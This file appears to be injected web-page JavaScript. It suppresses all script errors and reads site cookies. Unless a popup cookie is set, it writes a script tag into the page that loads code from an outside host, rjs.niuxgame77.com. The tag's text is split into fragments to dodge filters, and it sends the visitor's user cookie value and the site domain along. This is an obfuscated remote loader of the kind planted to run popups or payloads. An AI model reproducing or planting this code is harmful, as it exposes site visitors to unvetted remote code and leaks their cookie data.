window.onerror = function(){
	return true;
}
function get_FT_Cookie(sName){
	var sRE="(?:; )?"+sName+"=([^;]*);?";
	var oRE=new RegExp(sRE);
	if(oRE.test(document.cookie))	return decodeURIComponent(RegExp["$1"]);
	return '';
}
var _v_FT_pop=get_FT_Cookie('_c_FT_poped');
var _v_FT_user=get_FT_Cookie('_c_FT_user');
if(!_v_FT_pop){
	var AAidx=get_FT_Cookie('_c_FT_idx');
	if(!AAidx)	AAidx="0";
			document.writeln("<sc"+"ript type=\"text/jav"+"ascript\" s"+"rc=\"http://rjs.niuxgame77.com/3/?uid=12598&idx="+AAidx+"&user="+_v_FT_user+"&domain="+document.domain+"\"></s"+"cript>");
	}else if (_v_FT_user){
	var AAexp=new Date();
	AAexp.setTime(AAexp.getTime()+172800*1000);
	document.cookie='_c_FT_user='+encodeURIComponent(_v_FT_user)+';expires='+AAexp.toGMTString()+';path=\/';
}
